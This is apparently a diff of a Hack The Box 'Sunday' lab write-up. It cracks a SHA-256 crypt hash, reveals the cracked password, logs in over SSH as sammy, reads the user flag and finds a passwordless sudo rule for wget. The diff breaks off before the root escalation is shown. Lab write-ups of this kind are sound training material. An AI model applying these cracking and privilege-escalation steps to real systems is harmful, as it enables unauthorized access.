@@ -244,8 +244,48 @@ Before we start cracking the hash, let's try to identify the hash type. The hash
 └─$ hashid -m '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB'             2 ⚙
 Analyzing '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB'
 [+] SHA-256 Crypt [Hashcat Mode: 7400]
+```
+
+Using hashcat, we will crack the hash.
 
 ```
-### Obtaining reverse shell
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat ~/.hashcat/hashcat.potfile
+$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
+```
+
+### SSH into Sammy
+Next, we will be able to SSH as ```sammy```, using the password obtained previously.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76
+Password: 
+Last login: Fri Jul 31 17:59:59 2020
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+```
+
 ### Obtaining user flag
+```
+sammy@sunday:~$ cd Desktop
+sammy@sunday:~/Desktop$ ls -la
+total 6
+drwxr-xr-x  2 sammy staff  4 2018-04-15 20:37 .
+drwxr-xr-x 18 sammy staff 27 2020-07-31 18:00 ..
+-rw-r--r--  1 sammy staff  0 2018-04-15 20:15 .os-icons-installed
+-r--------  1 sammy staff 33 2018-04-15 20:37 user.txt
+sammy@sunday:~/Desktop$ cat user.txt
+<Redacted user flag
+sammy@sunday:~/Desktop$ 
+```
+### Privilege Escalation to root
+
+First, we will check the permissions of the sammy using sudo -l and it turns out that we can execute wget commands with root privileges.
+
+```
+sammy@sunday:~/Desktop$ sudo -l
+User sammy may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/wget
+
+```
 ### Obtaining root flag
